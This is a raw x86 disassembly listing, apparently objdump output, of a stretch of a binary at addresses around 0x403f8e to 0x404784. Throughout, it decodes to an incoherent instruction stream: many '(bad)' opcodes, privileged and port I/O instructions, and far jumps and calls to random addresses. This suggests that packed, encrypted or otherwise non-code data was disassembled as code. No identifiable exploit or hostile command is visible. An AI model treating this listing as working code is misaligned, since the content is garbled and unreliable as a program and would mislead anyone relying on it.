  403f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f8f:	sbb    ebx,esi
  403f91:	dec    esp
  403f92:	dec    ecx
  403f93:	scas   al,BYTE PTR es:[edi]
  403f94:	div    al
  403f96:	cwde   
  403f97:	ja     0x403fa2
  403f99:	inc    esi
  403f9a:	aaa    
  403f9b:	enter  0xef0,0xe3
  403f9f:	cmp    al,0xaf
  403fa1:	mov    ecx,0x69e513d0
  403fa6:	and    al,0x38
  403fa8:	inc    ecx
  403fa9:	outs   dx,DWORD PTR ds:[esi]
  403faa:	sti    
  403fab:	and    eax,0xbeae16d5
  403fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fb1:	std    
  403fb2:	rol    DWORD PTR [esi+0xb],cl
  403fb5:	pop    es
  403fb6:	jnp    0x404003
  403fb8:	add    esi,esi
  403fba:	xor    BYTE PTR [ebp-0x47],cl
  403fbd:	(bad)  
  403fbe:	frstor [ecx]
  403fc0:	xor    DWORD PTR [eax],ebp
  403fc2:	and    DWORD PTR ds:0x466c4283,edx
  403fc8:	ins    BYTE PTR es:[edi],dx
  403fc9:	inc    eax
  403fca:	push   edi
  403fcb:	retf   0x2d50
  403fce:	jmp    0x38b4b625
  403fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd4:	dec    esi
  403fd5:	pop    esi
  403fd6:	cmp    BYTE PTR [eax],ch
  403fd8:	ror    eax,0xbd
  403fdb:	sub    al,0x5f
  403fdd:	mov    cs,esi
  403fdf:	mov    edi,0xe364e38e
  403fe4:	test   bh,ah
  403fe6:	sub    eax,DWORD PTR [edx]
  403fe8:	sub    ah,BYTE PTR ds:[ebx+0x7c]
  403fec:	ret    
  403fed:	add    al,0x24
  403fef:	xor    ah,BYTE PTR [ecx]
  403ff1:	inc    ebp
  403ff2:	xlat   BYTE PTR ds:[ebx]
  403ff3:	pop    ds
  403ff4:	aas    
  403ff5:	and    esi,esi
  403ff7:	in     eax,0xa5
  403ff9:	(bad)  
  403ffa:	add    cl,BYTE PTR ds:[ecx+ebx*1-0x49]
  403fff:	leave  
  404000:	(bad)  
  404001:	sbb    edi,ecx
  404003:	or     eax,0xadc47c02
  404008:	dec    esp
  404009:	mov    WORD PTR [ebp+0x1d0695d3],fs
  40400f:	hlt    
  404010:	xor    esi,DWORD PTR [edi]
  404012:	mov    esi,0x297e1d75
  404017:	into   
  404018:	pusha  
  404019:	sbb    ebp,0xffffff81
  40401c:	jnp    0x404055
  40401e:	pop    ebx
  40401f:	daa    
  404020:	jo     0x404014
  404022:	retf   
  404023:	lods   al,BYTE PTR ds:[esi]
  404024:	mov    dh,dh
  404026:	sbb    al,0x10
  404028:	pop    edi
  404029:	into   
  40402a:	not    DWORD PTR [esp+eax*4]
  40402d:	push   esi
  40402e:	push   es
  40402f:	or     ah,BYTE PTR [esi+0x1a]
  404032:	sub    esi,edi
  404034:	xor    BYTE PTR [edi+esi*1-0x29],bh
  404038:	iret   
  404039:	call   0x42be:0x8ea9e2f4
  404040:	inc    ecx
  404041:	call   0x9683:0x5369de82
  404048:	test   eax,0x976bc89d
  40404d:	inc    ecx
  40404e:	or     esi,DWORD PTR [ebp+0x21]
  404051:	test   BYTE PTR ds:0xc488b0bb,cl
  404057:	loop   0x404088
  404059:	lods   al,BYTE PTR ds:[esi]
  40405a:	mov    WORD PTR [edx-0x6e],es
  40405d:	push   esp
  40405e:	loope  0x4040a5
  404060:	xchg   esi,ebp
  404062:	mov    esi,0x5ea1731d
  404067:	test   eax,0x3b063635
  40406c:	ins    BYTE PTR es:[edi],dx
  40406d:	mov    bl,0x65
  40406f:	cdq    
  404070:	cmp    DWORD PTR [esi+0x3b0e1ed1],0xffffffe0
  404077:	or     BYTE PTR [ebp+0x22d26762],bl
  40407d:	jne    0x404078
  40407f:	mov    edx,0x32a61c61
  404084:	xchg   ecx,eax
  404085:	popf   
  404086:	mov    ecx,0xc51eb025
  40408b:	loope  0x40406e
  40408d:	xor    eax,0x2c530d1
  404092:	aad    0xba
  404094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404095:	outs   dx,DWORD PTR gs:[esi]
  404097:	cdq    
  404098:	jecxz  0x404061
  40409a:	mov    dl,0xf3
  40409c:	test   eax,0xc05a4762
  4040a1:	fwait
  4040a2:	push   edi
  4040a3:	cmp    dl,BYTE PTR [ebx-0x18387f9f]
  4040a9:	bound  esi,QWORD PTR [ebx+eiz*8]
  4040ac:	jp     0x4040d3
  4040ae:	sbb    ah,al
  4040b0:	mov    edi,DWORD PTR [ecx+ebx*2+0x13]
  4040b4:	xlat   BYTE PTR ds:[ebx]
  4040b5:	sub    DWORD PTR [ebx],edx
  4040b7:	mov    ds:0x41089819,eax
  4040bc:	pop    ebp
  4040bd:	test   DWORD PTR [edx+0x19],esp
  4040c0:	cmc    
  4040c1:	popa   
  4040c2:	test   eax,0xb245e3ef
  4040c7:	clc    
  4040c8:	aaa    
  4040c9:	xchg   ecx,eax
  4040ca:	sub    eax,0xfe4ad5e2
  4040cf:	ret    
  4040d0:	sbb    ebx,DWORD PTR [ecx]
  4040d2:	and    al,0x8c
  4040d4:	ss cmc 
  4040d6:	jb     0x40412b
  4040d8:	mov    ebx,0x9794fdb
  4040dd:	sbb    al,0x5b
  4040df:	daa    
  4040e0:	stc    
  4040e1:	xor    eax,0x71b10ed0
  4040e6:	adc    eax,0x54509ed3
  4040eb:	dec    eax
  4040ec:	hlt    
  4040ed:	int3   
  4040ee:	and    ebp,edx
  4040f0:	inc    esp
  4040f1:	add    eax,0xcd4a8f7
  4040f6:	out    0xba,eax
  4040f8:	sub    eax,0x33a36b82
  4040fd:	xchg   BYTE PTR [eax],dl
  4040ff:	adc    al,0x9c
  404101:	cdq    
  404102:	stos   DWORD PTR es:[edi],eax
  404103:	add    dl,BYTE PTR [ebx-0x876924]
  404109:	or     ah,BYTE PTR [ecx+0x41bfae0d]
  40410f:	in     eax,0xa2
  404111:	jg     0x40416f
  404113:	xchg   ebp,eax
  404114:	push   edx
  404115:	lea    edx,[edx-0x2b574fb0]
  40411b:	add    ebx,DWORD PTR [edi+0x56]
  40411e:	add    cl,BYTE PTR [eax+0x4c2ada92]
  404124:	adc    eax,0xa25d4487
  404129:	call   0x7756:0xb42569ef
  404130:	dec    ebx
  404131:	stos   BYTE PTR es:[edi],al
  404132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404133:	sahf   
  404134:	fild   DWORD PTR [esi+0x7cc514c5]
  40413a:	mov    al,0x99
  40413c:	push   eax
  40413d:	ds push ecx
  40413f:	sub    eax,ecx
  404141:	push   eax
  404142:	ss cmc 
  404144:	repz xor eax,DWORD PTR [esi]
  404147:	xor    ah,BYTE PTR [ecx+edx*1]
  40414a:	out    0x18,eax
  40414c:	dec    ebp
  40414d:	or     eax,0x3c5c4bab
  404152:	pop    ebx
  404153:	adc    DWORD PTR [edi-0x72],eax
  404156:	pop    ebx
  404157:	mov    esi,0x830e2de3
  40415c:	retf   0xfd69
  40415f:	jae    0x40411e
  404161:	pop    esi
  404162:	add    eax,0x75a80385
  404167:	cldemote BYTE PTR [esi+0x4f]
  40416b:	fimul  WORD PTR [esi+0x49]
  40416e:	ja     0x4041dc
  404170:	xor    edi,DWORD PTR [edi-0x5e7e16ef]
  404176:	dec    esi
  404177:	sbb    BYTE PTR [ebp+0x3267d84c],0xdb
  40417e:	in     al,0xfd
  404180:	pop    edx
  404181:	push   eax
  404182:	jl     0x40417f
  404184:	lock ret 
  404186:	scas   eax,DWORD PTR es:[edi]
  404187:	scas   eax,DWORD PTR es:[edi]
  404188:	cs mov edx,0xd22a6934
  40418e:	test   BYTE PTR [edx-0x5f],bl
  404191:	cli    
  404192:	xor    eax,0x85ed7189
  404197:	sahf   
  404198:	outs   dx,BYTE PTR ds:[esi]
  404199:	add    BYTE PTR [edi+0x5362286a],0xec
  4041a0:	sub    ah,BYTE PTR [ecx]
  4041a2:	xor    BYTE PTR [ebp-0x16],0x92
  4041a6:	pop    edx
  4041a7:	shl    DWORD PTR [edi-0x5ddeeb1d],cl
  4041ad:	or     BYTE PTR [ebp-0x745ebdc1],bl
  4041b3:	cli    
  4041b4:	push   ebp
  4041b5:	jbe    0x4041a3
  4041b7:	or     bh,BYTE PTR [edx-0x13f7c1c5]
  4041bd:	mov    dl,0x6a
  4041bf:	jmp    esi
  4041c1:	jae    0x40419c
  4041c3:	xchg   edi,eax
  4041c4:	fwait
  4041c5:	not    DWORD PTR [esi]
  4041c7:	pop    edi
  4041c8:	pop    ds
  4041c9:	mov    al,ds:0xf416e5ce
  4041ce:	icebp  
  4041cf:	push   0x1df4494f
  4041d4:	xor    bl,dl
  4041d6:	mov    esi,0xf264b230
  4041db:	sub    eax,0x2d70ab7c
  4041e0:	add    eax,0xbbe6d1f0
  4041e5:	aad    0x14
  4041e7:	xchg   esp,eax
  4041e8:	iret   
  4041e9:	or     al,0x3b
  4041eb:	sub    ecx,DWORD PTR [edx]
  4041ed:	add    BYTE PTR [ecx],ah
  4041ef:	mov    edx,0x95826a5
  4041f4:	mov    ebp,0xb6f8038b
  4041f9:	fs in  al,0x8f
  4041fc:	xlat   BYTE PTR ds:[ebx]
  4041fd:	js     0x4041fb
  4041ff:	or     eax,DWORD PTR [esi+ebx*8]
  404202:	fdivr  QWORD PTR [edx]
  404204:	sbb    DWORD PTR [ebx],0xae391c9b
  40420a:	fwait
  40420b:	mov    al,ds:0xb808ccff
  404210:	adc    al,dh
  404212:	out    0xd4,eax
  404214:	inc    eax
  404215:	sub    BYTE PTR [ecx-0x3fcf24dd],bl
  40421b:	and    al,0x22
  40421d:	lods   eax,DWORD PTR ds:[esi]
  40421e:	out    0xfe,al
  404220:	mov    DWORD PTR [esi],ecx
  404222:	xchg   esi,eax
  404223:	dec    edx
  404224:	pop    esi
  404225:	adc    al,0xc4
  404227:	add    eax,DWORD PTR [edi]
  404229:	gs adc al,0x8c
  40422d:	inc    DWORD PTR [ebx+0x1ad45e8d]
  404233:	sub    al,0x2f
  404235:	jae    0x4042ac
  404237:	pop    edi
  404238:	cmp    al,0xca
  40423b:	clc    
  40423c:	pop    edx
  40423d:	xor    bl,ch
  40423f:	jmp    0x404273
  404241:	das    
  404242:	adc    DWORD PTR [ebx],0x7f
  404245:	outs   dx,DWORD PTR ds:[esi]
  404246:	xchg   BYTE PTR [ebp+0x55],cl
  404249:	test   eax,0x42531b97
  40424e:	clc    
  40424f:	push   ebp
  404250:	dec    edi
  404251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404252:	cwde   
  404253:	xlat   BYTE PTR ds:[ebx]
  404254:	mov    edx,0xe1aa3883
  404259:	cmp    al,0x95
  40425b:	push   eax
  40425c:	pushf  
  40425d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40425e:	mov    ebx,0x49aff075
  404263:	stos   DWORD PTR es:[edi],eax
  404264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404265:	mov    eax,es:0xd5ede3ee
  40426b:	dec    esi
  40426c:	cmc    
  40426d:	(bad)  
  40426e:	jmp    0x580af38f
  404273:	data16 je 0x4042dd
  404276:	pop    ecx
  404277:	sub    edx,DWORD PTR [ebx-0x2923d2ad]
  40427d:	les    esi,FWORD PTR ds:0xa4f279e3
  404283:	mov    DWORD PTR [ebx+0x5af517dc],edx
  404289:	ficom  WORD PTR [eax+0x25]
  40428c:	ret    
  40428d:	dec    esp
  40428e:	call   0x84dd:0x6636ca69
  404295:	push   ecx
  404296:	or     al,0xf1
  404298:	cdq    
  404299:	jmp    0xd71d35ab
  40429e:	es pop edx
  4042a0:	outs   dx,DWORD PTR ds:[esi]
  4042a1:	or     eax,0xe405d345
  4042a6:	mov    edi,edi
  4042a8:	arpl   WORD PTR ds:0xdb34f2b4,dx
  4042ae:	adc    BYTE PTR [ecx-0x5dd909a7],bh
  4042b4:	rcl    BYTE PTR [edx+0x6d],cl
  4042b7:	aas    
  4042b8:	icebp  
  4042b9:	(bad)  
  4042ba:	and    eax,0xbdd989c3
  4042bf:	adc    al,0xef
  4042c1:	or     edi,DWORD PTR [eax]
  4042c3:	pop    ecx
  4042c4:	dec    ecx
  4042c5:	loopne 0x4042e8
  4042c7:	inc    esi
  4042c8:	xor    eax,0x90b63a33
  4042cd:	out    0xe2,eax
  4042cf:	dec    edi
  4042d0:	aas    
  4042d1:	iret   
  4042d2:	out    dx,eax
  4042d3:	stos   DWORD PTR es:[edi],eax
  4042d4:	imul   edx,DWORD PTR [ebp-0x5b],0xffffff8a
  4042d8:	loope  0x404331
  4042da:	rcr    BYTE PTR [ebx+0x64],1
  4042dd:	int    0x4b
  4042df:	jmp    0xce91:0xafd892df
  4042e6:	xor    dh,al
  4042e8:	inc    ecx
  4042e9:	shl    BYTE PTR [ecx-0x62d3ad3f],1
  4042ef:	repnz test al,0x60
  4042f2:	js     0x4042b8
  4042f4:	sub    al,0x56
  4042f6:	jg     0x40430d
  4042f8:	not    dl
  4042fa:	mov    esi,DWORD PTR [eax+0x11]
  4042fd:	inc    DWORD PTR [edx]
  4042ff:	hlt    
  404300:	adc    al,0xbd
  404302:	in     al,0x89
  404304:	in     al,dx
  404305:	ret    0x2ed3
  404308:	or     al,0x91
  40430a:	inc    esp
  40430b:	pop    es
  40430c:	add    al,0xab
  40430e:	cmp    cl,BYTE PTR [edx+0x0]
  404311:	int3   
  404312:	cmp    DWORD PTR [edi],0x14524119
  404318:	lahf   
  404319:	jb     0x4042b6
  40431b:	aam    0x47
  40431d:	cmp    BYTE PTR [edi+0x57],bl
  404320:	push   ecx
  404321:	inc    eax
  404322:	jmp    0x197c:0xdece4ee
  404329:	cld    
  40432a:	xchg   ebx,eax
  40432b:	jo     0x404342
  40432d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40432e:	or     cl,0x43
  404331:	stos   DWORD PTR es:[edi],eax
  404332:	jno    0x404376
  404334:	sub    al,0x78
  404336:	jg     0x40434b
  404338:	inc    esi
  404339:	sbb    eax,0x435701cb
  40433e:	adc    ah,BYTE PTR [ecx+0x7907f5a8]
  404344:	jne    0x4042f2
  404346:	xor    DWORD PTR [esi],ebx
  404348:	inc    esp
  404349:	fbstp  TBYTE PTR [eax-0x6ce7e29a]
  40434f:	fmul   DWORD PTR ds:0x72ca55cb
  404355:	inc    esp
  404356:	jbe    0x4042e2
  404358:	xor    eax,0x35d89139
  40435d:	lea    edx,[esi+0x51]
  404360:	aam    0xd3
  404362:	(bad)  
  404363:	enter  0x340b,0x93
  404367:	dec    edx
  404368:	jno    0x404341
  40436a:	fdiv   QWORD PTR [edi+0x5f]
  40436d:	mov    esp,0x14846714
  404372:	call   0x7923:0x377f9683
  404379:	cmp    bl,BYTE PTR es:[esp+eax*8]
  40437d:	das    
  40437e:	sub    eax,0x6a2f10f5
  404383:	ss jbe 0x404393
  404386:	fld    QWORD PTR [ebx+0xdce9eac]
  40438c:	jmp    0x8013:0x5e54611e
  404393:	and    DWORD PTR [edx],edx
  404395:	(bad)  
  404396:	sub    DWORD PTR [edi+0x76e9cd6d],ecx
  40439c:	ins    DWORD PTR es:[edi],dx
  40439d:	cld    
  40439e:	sbb    al,bh
  4043a0:	fs mov ecx,0x2ac5bb9b
  4043a6:	sbb    dh,BYTE PTR [edx]
  4043a8:	mov    esp,0xa0d33c4e
  4043ad:	outs   dx,BYTE PTR ds:[esi]
  4043ae:	(bad)  
  4043af:	addr16 pop ebp
  4043b1:	in     eax,0xd4
  4043b3:	clc    
  4043b4:	das    
  4043b5:	jo     0x4043df
  4043b7:	mov    ds:0x55522867,al
  4043bc:	out    0xa8,eax
  4043be:	and    ebp,ebp
  4043c0:	jl     0x4043c9
  4043c2:	jns    0x404356
  4043c4:	xor    eax,0x9feb2013
  4043c9:	jp     0x40443a
  4043cb:	push   edi
  4043cc:	mov    ebx,esi
  4043ce:	and    BYTE PTR [ecx],bl
  4043d0:	fild   QWORD PTR [edx-0x5989eb09]
  4043d6:	xchg   ebx,eax
  4043d7:	in     eax,dx
  4043d8:	push   esp
  4043d9:	add    BYTE PTR [ebx],0x8f
  4043dc:	(bad)  
  4043dd:	push   edi
  4043de:	and    eax,edi
  4043e0:	mov    ecx,0x1bdc8097
  4043e5:	mov    al,0x60
  4043e7:	sub    BYTE PTR ds:0x4d3b9759,dl
  4043ed:	adc    dh,0x7
  4043f0:	ret    0x6081
  4043f3:	shl    DWORD PTR [ebp+0x36],cl
  4043f6:	add    BYTE PTR [ecx-0x70e80888],dh
  4043fc:	and    edi,DWORD PTR [edi]
  4043fe:	push   eax
  4043ff:	in     al,0x5b
  404401:	aam    0x5e
  404403:	sbb    al,0x4a
  404405:	shl    DWORD PTR [ecx-0x30f2c98b],0x70
  40440c:	xor    al,0x4a
  40440e:	test   al,0xc3
  404410:	(bad)  
  404411:	loop   0x4043fc
  404413:	gs dec eax
  404415:	jp     0x40447c
  404417:	shl    BYTE PTR [edx+0x4b2915e0],cl
  40441d:	cmp    eax,0x55f1b80c
  404422:	mov    DWORD PTR [edi],0x7023e844
  404428:	ret    
  404429:	pop    esp
  40442a:	popw   ss
  40442c:	cwde   
  40442d:	mov    bl,0xf2
  40442f:	dec    eax
  404430:	sub    eax,0x7377a3a3
  404435:	popa   
  404436:	lods   al,BYTE PTR ds:[esi]
  404437:	bound  eax,QWORD PTR [ebx]
  404439:	fs xchg ebx,eax
  40443b:	sub    esi,DWORD PTR [edi+0x2e567ff2]
  404441:	add    eax,0xddf125e3
  404446:	sbb    cl,al
  404448:	in     eax,0xaf
  40444a:	cmp    esi,DWORD PTR [ebx+0x4d]
  40444d:	adc    bl,BYTE PTR [esi]
  40444f:	xchg   esp,eax
  404450:	nop
  404451:	ret    0x9bec
  404454:	mov    ds:0xcb8dc821,eax
  404459:	ins    BYTE PTR es:[edi],dx
  40445a:	sub    DWORD PTR [ebp+eax*4-0x5eedb404],ebp
  404461:	sub    BYTE PTR [edi+0x71538e98],bl
  404467:	xor    al,0xb5
  404469:	leave  
  40446a:	push   0xb3f5fd5f
  40446f:	push   ecx
  404470:	pop    ss
  404471:	sbb    ebx,DWORD PTR [ecx-0x5f502c57]
  404477:	sub    al,0x2c
  404479:	nop
  40447a:	jge    0x4044fb
  40447c:	mov    edx,0xd4be2bfd
  404481:	call   0xc7a9e634
  404486:	mov    DWORD PTR [esi+0x56],ebp
  404489:	loop   0x4044b4
  40448b:	add    bl,BYTE PTR [ecx]
  40448d:	sbb    DWORD PTR [ebp+0x4d354ae1],ebx
  404493:	adc    DWORD PTR [ebx-0x49],0xffffffb4
  404497:	and    esi,DWORD PTR [ebp-0x2]
  40449a:	imul   esi,DWORD PTR [eax],0x4d
  40449d:	dec    eax
  40449e:	add    ch,BYTE PTR [ebp-0x5]
  4044a1:	push   eax
  4044a2:	fs xchg ebp,eax
  4044a4:	dec    ebx
  4044a5:	loope  0x404435
  4044a7:	add    BYTE PTR [esi+0x10706219],dh
  4044ad:	jp     0x404523
  4044af:	data16 jp 0x404457
  4044b2:	mov    ebp,0xc27a7fe5
  4044b7:	and    esi,ecx
  4044b9:	sbb    dl,ah
  4044bb:	and    DWORD PTR [edx+0xf],0xb85fb2a1
  4044c2:	into   
  4044c3:	jp     0x40452e
  4044c5:	cmp    DWORD PTR [ecx],0x6a4bc3ac
  4044cb:	aam    0xa3
  4044cd:	add    cl,BYTE PTR [ebx+0x2b]
  4044d0:	aam    0x73
  4044d2:	lea    edi,[ecx]
  4044d4:	pop    ebx
  4044d5:	jp     0x4044e2
  4044d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044d8:	or     ebx,DWORD PTR [ebp-0x4c]
  4044db:	pop    esp
  4044dc:	outs   dx,DWORD PTR ds:[esi]
  4044dd:	mov    eax,0xd3f22eb8
  4044e2:	pop    edx
  4044e3:	ror    eax,cl
  4044e5:	mov    al,0xdf
  4044e7:	add    al,ah
  4044e9:	dec    esi
  4044ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044eb:	lds    esp,FWORD PTR ds:0x704e2082
  4044f1:	push   ecx
  4044f2:	or     DWORD PTR [eax],ecx
  4044f4:	es jmp 0x7649c44e
  4044fa:	addr16 out dx,al
  4044fc:	push   ebx
  4044fd:	xchg   ebp,ebx
  4044ff:	jne    0x404501
  404501:	jmp    0x70d136df
  404506:	in     al,0xd6
  404508:	xor    eax,DWORD PTR [ecx-0x7f90618d]
  40450e:	add    ebp,DWORD PTR [ebx-0x789b5bfd]
  404514:	mov    edx,DWORD PTR [edi]
  404516:	dec    ecx
  404517:	rcr    esp,0x4f
  40451a:	mov    eax,ds:0x4da661f3
  40451f:	or     esi,esp
  404521:	out    0x6e,al
  404523:	mov    DWORD PTR [ebx],ecx
  404525:	ins    BYTE PTR es:[edi],dx
  404526:	sbb    BYTE PTR [ecx],bl
  404528:	sbb    DWORD PTR [ebx+0x18fdd8c6],0xf61401c5
  404532:	sub    eax,0xbd6ac9c
  404537:	cld    
  404538:	pop    esi
  404539:	inc    esp
  40453a:	or     cl,BYTE PTR [edx+edx*2+0x30]
  40453e:	jae    0x4044e9
  404540:	xor    ebx,edi
  404542:	mov    bh,0x45
  404544:	push   ss
  404545:	cwde   
  404546:	lods   al,BYTE PTR ds:[esi]
  404547:	loop   0x4044e1
  404549:	mov    dl,0x3a
  40454c:	jl     0x404502
  40454e:	mov    eax,ds:0xff7b30b6
  404553:	sbb    ch,BYTE PTR gs:[eax+eax*1-0x5cd77fa8]
  40455b:	fidivr DWORD PTR [eax+0x51]
  40455e:	(bad)  
  40455f:	inc    edx
  404560:	cmp    DWORD PTR [ebx+0x27],eax
  404563:	stos   BYTE PTR es:[edi],al
  404564:	iret   
  404565:	add    ecx,DWORD PTR [edx+0x6f]
  404568:	xor    eax,0x641d77f9
  40456d:	inc    eax
  40456e:	into   
  40456f:	xor    BYTE PTR [ebx],ah
  404571:	xchg   ecx,eax
  404572:	cmp    BYTE PTR [edi],cl
  404574:	aam    0xeb
  404576:	add    edx,ebp
  404578:	enter  0x6a16,0x55
  40457c:	add    ebx,DWORD PTR [ebx+0x27a37cac]
  404582:	out    0xb8,al
  404584:	jb     0x4045ba
  404586:	xor    eax,0xefc486f9
  40458b:	and    BYTE PTR [edx],al
  40458d:	imul   eax,DWORD PTR [eax+edx*4-0x56],0x12
  404592:	xchg   edi,eax
  404593:	mov    ds:0xf74b6c3e,eax
  404598:	imul   ebx,DWORD PTR [edi-0x1f],0x2a
  40459c:	push   0xffffffc9
  40459e:	ficomp WORD PTR [esp+ebp*2+0x74]
  4045a2:	inc    ebx
  4045a3:	nop
  4045a4:	das    
  4045a5:	mov    ?,WORD PTR [eax]
  4045a7:	cmp    BYTE PTR [ecx+0x3e06ad7],dl
  4045ad:	daa    
  4045ae:	(bad)  
  4045af:	fsub   QWORD PTR [eax-0x7e6751f7]
  4045b5:	sub    ebx,DWORD PTR [edx+0x2a89c681]
  4045bb:	mov    edi,0x7831ba56
  4045c0:	scas   eax,DWORD PTR es:[edi]
  4045c1:	xor    DWORD PTR [ebx-0x1e],ebx
  4045c4:	jne    0x40455a
  4045c6:	push   ebp
  4045c7:	mov    edx,0xe4536d86
  4045cc:	mov    eax,0xb2187ce6
  4045d1:	data16 test BYTE PTR [ebx],bl
  4045d4:	inc    ecx
  4045d5:	je     0x40462e
  4045d7:	fdiv   DWORD PTR ds:0xf6fe73b3
  4045dd:	in     al,0x84
  4045df:	fmul   st,st(6)
  4045e1:	mov    dh,0x59
  4045e3:	in     al,dx
  4045e4:	loopne 0x40465f
  4045e6:	data16 out 0x3a,al
  4045e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ea:	test   al,0xdd
  4045ec:	scas   al,BYTE PTR es:[di]
  4045ee:	jmp    0x404634
  4045f0:	rol    ebp,0x2c
  4045f3:	pop    edi
  4045f4:	or     DWORD PTR [edx],ecx
  4045f6:	cmp    edx,DWORD PTR [ebx+0x28144ddd]
  4045fc:	dec    ecx
  4045fd:	imul   ebp,edx,0x57aff9f8
  404603:	pop    ds
  404604:	stos   BYTE PTR es:[edi],al
  404605:	pop    ecx
  404606:	out    dx,eax
  404607:	das    
  404608:	jno    0x404628
  40460a:	nop
  40460b:	pop    es
  40460c:	out    dx,al
  40460d:	mov    esp,0xbf1f66b3
  404612:	lods   al,BYTE PTR ds:[esi]
  404613:	or     eax,0xc0679d25
  404618:	sub    dl,al
  40461a:	jp     0x4045f3
  40461c:	test   al,0xed
  40461e:	push   esp
  40461f:	adc    al,0xf6
  404621:	xchg   esp,eax
  404622:	or     DWORD PTR [bx+di],esi
  404625:	stc    
  404626:	std    
  404627:	push   0x8f8a7bcb
  40462c:	dec    ebx
  40462d:	sbb    edi,edx
  40462f:	bound  ecx,QWORD PTR [edi]
  404631:	xchg   ecx,eax
  404632:	mov    ecx,0xd630b613
  404637:	and    eax,0xf7f67881
  40463c:	xor    DWORD PTR [edi-0x662934ad],edi
  404642:	and    ebp,ebp
  404644:	rcl    BYTE PTR [esi],0xca
  404647:	xor    cl,bl
  404649:	xor    bl,BYTE PTR [ecx+edx*4+0x18]
  40464d:	or     ebp,DWORD PTR [ebp-0x59]
  404650:	call   0x8c020b5a
  404655:	sbb    BYTE PTR [ebx+0x32],ah
  404658:	jle    0x404687
  40465a:	shl    DWORD PTR [esi-0xdc79db5],1
  404660:	fwait
  404661:	imul   esp,DWORD PTR [ecx-0x3e],0x9988f02f
  404668:	mov    ebx,gs
  40466a:	fbstp  TBYTE PTR [ebp-0x52]
  40466d:	popa   
  40466e:	xor    eax,0xf6b2b6e0
  404673:	sub    eax,0x5764169
  404678:	stc    
  404679:	dec    eax
  40467a:	fbstp  TBYTE PTR [ebx]
  40467c:	mov    cl,dl
  40467e:	cmp    BYTE PTR [edx+0x46],al
  404681:	inc    edi
  404682:	dec    ebx
  404683:	popf   
  404684:	ins    BYTE PTR es:[edi],dx
  404685:	mov    ds:0x8b03b7c1,eax
  40468a:	adc    bh,BYTE PTR [edx]
  40468c:	adc    eax,0x823b920e
  404691:	imul   ecx,ebx,0x33
  404694:	mov    edx,0x5e29e97b
  404699:	mov    ds:0x8452ac00,eax
  40469e:	popa   
  40469f:	add    bl,BYTE PTR [ebp+0x41fa29f6]
  4046a5:	arpl   WORD PTR [ecx],dx
  4046a7:	icebp  
  4046a8:	shl    BYTE PTR [edi-0x320e63a1],1
  4046ae:	xor    BYTE PTR [esi-0x61],dh
  4046b1:	loopne 0x404724
  4046b3:	xchg   edi,eax
  4046b4:	ror    BYTE PTR [edx],cl
  4046b6:	enter  0xfc04,0xdb
  4046ba:	push   edi
  4046bb:	xor    cl,al
  4046bd:	dec    eax
  4046be:	dec    ecx
  4046bf:	lahf   
  4046c0:	sbb    dh,BYTE PTR [ebx+0x4c]
  4046c3:	pop    edi
  4046c4:	or     edx,eax
  4046c6:	test   DWORD PTR [ebp+0x67],edx
  4046c9:	sub    al,0x6d
  4046cb:	out    0x16,eax
  4046cd:	stos   DWORD PTR es:[edi],eax
  4046ce:	jnp    0x40470c
  4046d0:	mov    edx,0x13444b8d
  4046d5:	call   0x53775b5b
  4046da:	add    al,0x36
  4046dc:	adc    edi,eax
  4046de:	das    
  4046df:	mov    cl,0x7
  4046e1:	ds imul esp,esp,0x42
  4046e5:	pop    edi
  4046e6:	xchg   edi,eax
  4046e7:	inc    edx
  4046e8:	or     dl,bh
  4046ea:	in     eax,0xc5
  4046ec:	jp     0x4046cf
  4046ee:	cmp    BYTE PTR [esi-0x6370f263],ah
  4046f4:	sub    ebx,DWORD PTR [ebx+0x35]
  4046f7:	sahf   
  4046f8:	jmp    0x4046d8
  4046fa:	ret    0x697
  4046fd:	sbb    DWORD PTR [ebx+0x6133addb],esp
  404703:	call   0x5f8fd56b
  404708:	iret   
  404709:	or     esp,DWORD PTR [ecx+0x64]
  40470c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40470d:	mov    esp,0x2dea89b2
  404712:	dec    edx
  404713:	lahf   
  404714:	ins    BYTE PTR es:[edi],dx
  404715:	push   ebx
  404716:	mov    ah,0x82
  404718:	into   
  404719:	in     al,0xec
  40471b:	sbb    ah,dh
  40471d:	mov    dl,0x94
  40471f:	lods   eax,DWORD PTR ds:[esi]
  404720:	sub    edx,DWORD PTR [ebp+0x257a4ab2]
  404726:	inc    edi
  404727:	cli    
  404728:	not    BYTE PTR cs:[ecx+0x2c]
  40472c:	mov    ebx,0xa0cebea7
  404731:	xchg   ebp,eax
  404732:	and    ebp,DWORD PTR [ebx]
  404734:	mov    ch,0x2b
  404736:	(bad)  
  404737:	fisub  DWORD PTR [ebx]
  404739:	shr    BYTE PTR [ecx],0x61
  40473c:	push   cs
  40473d:	jmp    0x2173:0x6248de9d
  404744:	xchg   BYTE PTR [esi+0x57],ch
  404747:	and    eax,0xb7cdc489
  40474c:	popa   
  40474d:	mov    ebx,0x4bbd45a5
  404752:	sbb    BYTE PTR [edi+0x6c],0xc
  404756:	loopne 0x40476c
  404758:	pushf  
  404759:	(bad)  
  40475a:	add    esi,edx
  40475c:	or     al,0xa8
  40475e:	jg     0x404794
  404760:	cmp    al,0xa2
  404762:	mov    bl,BYTE PTR [esi]
  404764:	adc    bl,0x6c
  404767:	xchg   ebx,eax
  404768:	push   0x65
  40476a:	xchg   ebx,eax
  40476b:	jns    0x40475f
  40476d:	(bad)  
  40476e:	sub    edx,esi
  404770:	std    
  404771:	ds push ebx
  404773:	mov    edi,0x773697d5
  404778:	xor    BYTE PTR [ecx],dl
  40477a:	daa    
  40477b:	push   es
  40477c:	(bad)  [eax+0xb]
  40477f:	arpl   si,di
  404781:	or     al,0xbf
  404783:	sti    
  404784:	push   cs
